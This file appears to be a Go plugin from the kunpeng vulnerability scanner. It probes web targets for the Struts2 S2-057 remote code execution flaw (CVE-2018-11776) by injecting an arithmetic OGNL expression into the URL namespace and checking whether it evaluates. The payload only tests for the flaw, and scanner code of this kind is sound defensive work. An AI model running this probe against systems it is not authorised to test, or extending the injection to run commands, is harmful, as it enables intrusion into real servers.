package goplugin

import (
	"net/http"
	"regexp"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type struts2_57 struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("struts2", &struts2_57{})
}
func (d *struts2_57) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Struts2 s2-057 远程代码执行",
		Remarks: "当struts.mapper.alwaysSelectFullNamespace设置为true，并且package标签页以及result的param标签页的namespace值的缺失，或使用了通配符时可造成namespace被控制，最终namespace会被带入OGNL语句执行，从而产生远程代码执行漏洞。",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://cwiki.apache.org/confluence/display/WW/S2-057",
			CVE:  "CVE-2018-11776",
			KPID: "KP-0078",
		},
	}
	return d.info
}
func (d *struts2_57) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *struts2_57) Check(URL string, meta plugin.TaskMeta) bool {
	poc := "/${(20000+33333)}"
	r, err := regexp.Compile(`\/(\w+)\/\S+\.(do|action)$`)
	if err != nil {
		return false
	}
	for _, url := range meta.FileList {
		if ok := r.MatchString(url); ok {
			m := r.FindStringSubmatch(url)
			if len(m) < 2 {
				continue
			}
			request, err := http.NewRequest("GET", strings.Replace(url, "/"+m[1], poc, 1), nil)
			if err != nil {
				continue
			}
			resp, err := util.RequestDo(request, true)
			if err != nil {
				continue
			}
			if strings.Contains(resp.Other.Request.URL.String(), "53333") {
				result := d.info
				result.Response = resp.ResponseRaw
				result.Request = resp.RequestRaw
				d.result = append(d.result, result)
				return true
			}
		}
	}
	return false
}
